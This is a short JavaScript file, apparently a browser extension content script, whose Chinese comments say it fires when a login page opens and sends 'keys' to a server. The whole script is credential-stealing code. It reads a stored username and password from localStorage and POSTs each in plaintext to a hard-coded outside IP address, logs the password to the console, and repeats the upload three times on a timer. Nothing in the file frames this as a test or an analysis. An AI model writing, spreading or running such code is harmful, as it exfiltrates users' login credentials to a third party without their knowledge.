console.log("########sendkey_content#######");
/*
    login页面一出来jump_content就会打开1111
    此脚本将给发送keys给server
*/
function sendmessage(){
    var username = localStorage.getItem('username');
	var password = localStorage.getItem('password');
	if(username||password == null){

	}
    var url = "http://49.232.13.120:1111/sendusername"
    var request = new XMLHttpRequest();/*用new创建一个XHR对象*/
    try{
        request.open("POST",url);/*设置XHR对象的请求方法与路径*/ 
		request.send(username);/*设置XHR对象不发送数据到服务器*/
		console.log("sending " + username);	
	}
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {/*设置当获XHR对象获取到返回信息后执行以下代码*/
        if(request.status == 200) {/*如果返回的状态为200，即为成功获取数据*/ 
            console.log(request.responseText);
        }else{
			console.log("server is 404")
		}
	}

	var url = "http://49.232.13.120:1111/sendpassword"
    var request = new XMLHttpRequest();/*用new创建一个XHR对象*/
    try{
        request.open("POST",url);/*设置XHR对象的请求方法与路径*/ 
		request.send(password);/*设置XHR对象不发送数据到服务器*/
		console.log("sending " + password);	
    }
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {/*设置当获XHR对象获取到返回信息后执行以下代码*/
        if(request.status == 200) {/*如果返回的状态为200，即为成功获取数据*/ 
            console.log(request.responseText);
        }
    }
}

for(var i = 0;i<3;i++){
	setTimeout(sendmessage,1000);
}



